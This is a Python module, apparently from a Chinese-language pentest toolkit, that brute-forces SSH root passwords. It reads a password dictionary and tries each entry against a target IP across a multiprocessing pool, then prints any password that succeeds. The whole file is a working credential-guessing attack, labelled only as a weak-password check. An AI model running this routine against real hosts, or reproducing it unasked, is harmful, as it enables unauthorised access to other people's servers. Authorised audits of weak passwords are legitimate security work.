from src.color_print import *
import requests
import re
from prettytable import PrettyTable
import sys
from multiprocessing import Pool
from src.ssh_connect import *
from tqdm import tqdm


def ssh_root_passwd_crack(ip, dict='./passwd_dict/dict.txt', user='root', threads='10'):
    print_info('正在检测' + color.green(ip) + color.green('是否存在') + color.green(user) + color.green('用户的ssh弱口令'), ip)
    ssh_user_passwd_table = PrettyTable(['用户名', '密码'])
    ip_passwd = []
    try:
        passwd_file = open(dict, 'r').readlines()
    except:
        print_error('密码路径错误', ip)
    for passwd in passwd_file:
        ip_passwd.append((ip, user, passwd.strip()))
    thread_count = int(threads)
    print_info('使用' + color.green(str(thread_count)) + color.green('个线程'), ip)
    try:
        with Pool(thread_count) as p:
            pool_result = list(tqdm(p.imap(ssh_connect, ip_passwd), total=len(ip_passwd)))
    except:
        pass
    for info in pool_result:
        # print(info)
        if info[0] == 1:
            print_info(color.white(ip) + '存在ssh弱口令', ip)
            ssh_user_passwd_table.add_row([user, info[1]])
            print(ssh_user_passwd_table)
            break
    else:
        print_error(color.white(ip) + '在该字典中不存在ssh弱口令', ip)
